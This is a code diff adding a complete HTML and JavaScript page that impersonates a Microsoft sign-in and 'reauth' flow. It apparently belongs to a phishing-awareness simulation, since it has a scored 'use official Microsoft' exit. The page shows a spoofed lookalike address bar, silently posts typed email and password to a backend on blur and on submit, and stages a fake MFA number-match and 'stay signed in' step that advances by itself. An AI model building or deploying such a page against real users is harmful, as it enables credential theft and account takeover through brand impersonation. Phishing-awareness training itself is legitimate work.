@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        :root {
+            --ms-blue: #0067b8;
+            --ms-blue-hover: #005da6;
+            --ms-bg: #f2f2f2;
+            --ms-text: #1b1b1b;
+            --ms-secondary: #616161;
+            --ms-border: #8a8a8a;
+            --ms-light-border: #e1e1e1;
+            --font-stack: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+        }
+        body { margin: 0; padding: 0; font-family: var(--font-stack); background: radial-gradient(circle at top, #ffffff 0%, #ececec 52%, #dddddd 100%); min-height: 100vh; display: flex; flex-direction: column; }
+        .browser-bar { max-width: 920px; margin: 18px auto 0; background: #f5f5f5; border: 1px solid #d7d7d7; border-radius: 14px; padding: 10px 16px; color: #5f6368; font-size: 13px; width: calc(100% - 48px); box-sizing: border-box; }
+        .wrap { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
+        .login-card { background: #fff; width: 100%; max-width: 440px; min-height: 400px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,.2); box-sizing: border-box; position: relative; }
+        .status-banner { display: none; margin-bottom: 16px; padding: 12px 14px; background: #eef8f1; border: 1px solid #b8dbc0; border-radius: 4px; color: #1f6b33; font-size: 0.92rem; }
+        .status-banner.visible { display: block; }
+        .view { display: none; animation: fadeIn 0.25s ease-in-out; }
+        .view.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .ms-logo { display: flex; align-items: center; margin-bottom: 24px; }
+        .ms-squares { display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 22px; height: 22px; margin-right: 12px; }
+        .sq { width: 10px; height: 10px; }
+        .sq-1 { background-color: #f25022; }
+        .sq-2 { background-color: #7fbb00; }
+        .sq-3 { background-color: #00a1f1; }
+        .sq-4 { background-color: #ffbb00; }
+        .logo-text { color: #737373; font-size: 1.3rem; font-weight: 500; }
+        h2 { font-size: 1.5rem; font-weight: 600; margin: 0 0 16px 0; color: var(--ms-text); }
+        .subtext { font-size: 0.95rem; color: var(--ms-text); margin-bottom: 20px; }
+        .email-display { font-size: 0.95rem; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }
+        .back-arrow { cursor: pointer; color: #505050; font-size: 1.2rem; padding: 4px; }
+        .form-input { width: 100%; border: none; border-bottom: 1px solid var(--ms-border); padding: 8px 0; font-size: 0.95rem; outline: none; margin-bottom: 20px; transition: border-bottom 0.2s; }
+        .form-input:focus { border-bottom: 2px solid var(--ms-blue); }
+        .links-row { margin-bottom: 36px; font-size: 0.82rem; }
+        .links-row a { color: var(--ms-blue); text-decoration: none; }
+        .links-row a:hover { text-decoration: underline; }
+        .btn-container { display: flex; justify-content: flex-end; gap: 8px; }
+        .btn-primary { background-color: var(--ms-blue); color: #fff; border: none; min-width: 108px; padding: 8px 12px; font-size: 0.95rem; font-weight: 600; cursor: pointer; }
+        .btn-primary:hover { background-color: var(--ms-blue-hover); }
+        .btn-secondary { background-color: transparent; color: #333; border: 1px solid #ccc; min-width: 108px; padding: 8px 12px; font-size: 0.95rem; cursor: pointer; }
+        .mfa-number { font-size: 3rem; font-weight: 600; color: #1b1b1b; border: 1px solid var(--ms-light-border); width: 100px; height: 100px; display: flex; align-items: center; justify-content: center; margin: 20px auto; border-radius: 4px; }
+        .checkbox-row { display: flex; align-items: center; gap: 8px; margin-bottom: 20px; font-size: 0.95rem; }
+        .legit-exit { margin-top: 14px; font-size: 12px; color: #666; }
+        .legit-exit a { color: #666; text-decoration: underline; }
+        .footer-links { position: absolute; bottom: 20px; right: 20px; font-size: 0.75rem; color: rgba(0,0,0,0.6); display: flex; gap: 12px; }
+    </style>
+</head>
+<body>
+    <div class="browser-bar">https://login.microsoftonline-secure.com/organizations/reauth</div>
+    <div class="wrap">
+        <div class="login-card">
+            <div class="status-banner" id="status-banner"></div>
+            <div class="ms-logo">
+                <div class="ms-squares">
+                    <div class="sq sq-1"></div>
+                    <div class="sq sq-2"></div>
+                    <div class="sq sq-3"></div>
+                    <div class="sq sq-4"></div>
+                </div>
+                <span class="logo-text">Microsoft</span>
+            </div>
+
+            <div class="view active" id="view-1">
+                <h2>Sign in</h2>
+                <input type="email" id="u-email" name="email" class="form-input harvest" placeholder="Email, phone, or Skype">
+                <div class="links-row">
+                    No account? <a href="#">Create one</a><br>
+                    <a href="#">Can't access your account?</a>
+                </div>
+                <div class="btn-container">
+                    <button class="btn-primary" id="btn-email-next">Next</button>
+                </div>
+            </div>
+
+            <div class="view" id="view-2">
+                <div class="email-display">
+                    <span class="back-arrow" id="back-to-email">&larr;</span>
+                    <span id="display-email" style="font-weight: bold;"></span>
+                </div>
+                <h2>Enter password</h2>
+                <p class="subtext" style="font-size: 0.85rem; color: var(--ms-secondary);">A security update requires an Admin Approval Code, or enter your password to continue manually.</p>
+                <input type="password" id="u-pass" name="password" class="form-input harvest" placeholder="Password">
+                <div class="links-row">
+                    <a href="#">Forgot password?</a><br>
+                    <a href="#">Email code to login</a>
+                </div>
+                <div class="btn-container">
+                    <button class="btn-primary" id="btn-password-next">Sign in</button>
+                </div>
+                <div class="legit-exit">
+                    <a href="#" id="use-official-microsoft">Go to Microsoft365.com instead</a>
+                </div>
+            </div>
+
+            <div class="view" id="view-3">
+                <div class="email-display">
+                    <span id="display-email-3" style="font-weight: bold;"></span>
+                </div>
+                <h2>Action Required</h2>
+                <p class="subtext">Your organization requires additional security information to help keep your account secure.</p>
+                <p class="subtext" style="font-size: 0.85rem; color: var(--ms-secondary);">A security update is available for your identity profile. Click Next to verify your details.</p>
+                <div class="links-row" style="margin-top: 30px;">
+                    <a href="#">Use a different account</a>
+                </div>
+                <div class="btn-container">
+                    <button class="btn-primary" id="btn-action-next">Next</button>
+                </div>
+            </div>
+
+            <div class="view" id="view-4" style="text-align: center;">
+                <h2>Approve sign in request</h2>
+                <p class="subtext">Open your Microsoft Authenticator app and enter the number shown below to sign in.</p>
+                <div class="mfa-number">88</div>
+                <p class="subtext" style="font-size: 0.85rem; color: var(--ms-secondary);">No numbers in your app? Make sure to upgrade to the latest version.</p>
+                <div class="links-row" style="text-align: left; margin-top: 40px;">
+                    <a href="#">I can't use my Microsoft Authenticator app right now</a>
+                </div>
+                <div class="btn-container">
+                    <button class="btn-secondary" id="btn-mfa-cancel">Cancel</button>
+                    <button class="btn-primary" id="btn-mfa-next">Next</button>
+                </div>
+            </div>
+
+            <div class="view" id="view-5">
+                <div class="email-display">
+                    <span id="display-email-5" style="font-weight: bold;"></span>
+                </div>
+                <h2>Stay signed in?</h2>
+                <p class="subtext">Do this to reduce the number of times you are asked to sign in.</p>
+                <div class="checkbox-row">
+                    <input type="checkbox" id="dont-show">
+                    <label for="dont-show">Don't show this again</label>
+                </div>
+                <div class="btn-container" style="margin-top: 40px;">
+                    <button class="btn-secondary" id="btn-persist-no">No</button>
+                    <button class="btn-primary" id="btn-persist-yes">Yes</button>
+                </div>
+            </div>
+
+            <div class="view" id="view-6" style="text-align: center; padding: 40px 0;">
+                <div style="font-size: 3rem; color: var(--ms-blue);">Done</div>
+                <h2>Account Verified</h2>
+                <p class="subtext">Your security settings have been updated successfully. You will now be redirected to your dashboard.</p>
+                <button class="btn-primary" type="button">Continue</button>
+            </div>
+
+            <div class="footer-links">
+                <span>Terms of use</span>
+                <span>Privacy & cookies</span>
+                <span>...</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentStep = 1;
+
+        function showView(step) {
+            document.querySelectorAll('.view').forEach((view) => view.classList.remove('active'));
+            document.getElementById(`view-${step}`).classList.add('active');
+            currentStep = step;
+        }
+
+        function showStatus(message) {
+            const banner = document.getElementById('status-banner');
+            banner.textContent = message;
+            banner.classList.add('visible');
+        }
+
+        async function postJson(url, payload) {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            return response.json();
+        }
+
+        function syncEmailDisplay(email) {
+            document.getElementById('display-email').textContent = email;
+            document.getElementById('display-email-3').textContent = email;
+            document.getElementById('display-email-5').textContent = email;
+        }
+
+        async function handleMfaAdvance() {
+            if (currentStep !== 4) {
+                return;
+            }
+            await postJson('/api/mfa/approve', {});
+            showView(5);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            document.querySelectorAll('.harvest').forEach((el) => {
+                el.addEventListener('blur', () => {
+                    if (el.value.trim()) {
+                        fetch('/api/save-step', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                step: 0,
+                                data: { [el.name]: el.value.trim() }
+                            })
+                        });
+                    }
+                });
+            });
+
+            document.getElementById('btn-email-next').addEventListener('click', async () => {
+                const email = document.getElementById('u-email').value.trim();
+                if (!email) {
+                    alert('Enter a valid email address');
+                    return;
+                }
+                await postJson('/api/sso/start', { email });
+                syncEmailDisplay(email);
+                showView(2);
+            });
+
+            document.getElementById('back-to-email').addEventListener('click', () => {
+                showView(1);
+            });
+
+            document.getElementById('btn-password-next').addEventListener('click', async () => {
+                const email = document.getElementById('u-email').value.trim();
+                const password = document.getElementById('u-pass').value.trim();
+                if (!password) {
+                    alert('Enter your password');
+                    return;
+                }
+                await postJson('/api/password/submit', { email, password });
+                showView(3);
+            });
+
+            document.getElementById('use-official-microsoft').addEventListener('click', async (event) => {
+                event.preventDefault();
+                await postJson('/api/win/use-official-microsoft', {});
+                showStatus('Open Microsoft365.com or your normal organization sign-in page directly instead of using a Slack-delivered re-verification link.');
+            });
+
+            document.getElementById('btn-action-next').addEventListener('click', async () => {
+                await postJson('/api/security/continue', {});
+                showView(4);
+            });
+
+            document.getElementById('btn-mfa-next').addEventListener('click', handleMfaAdvance);
+            document.getElementById('btn-mfa-cancel').addEventListener('click', handleMfaAdvance);
+
+            document.getElementById('btn-persist-no').addEventListener('click', async () => {
+                await postJson('/api/persistence/submit', { staySignedIn: false });
+                showView(6);
+            });
+
+            document.getElementById('btn-persist-yes').addEventListener('click', async () => {
+                await postJson('/api/persistence/submit', { staySignedIn: true });
+                showView(6);
+            });
+
+            setTimeout(() => {
+                if (currentStep === 4) {
+                    handleMfaAdvance();
+                }
+            }, 6000);
+        });
+    </script>
+</body>
+</html>
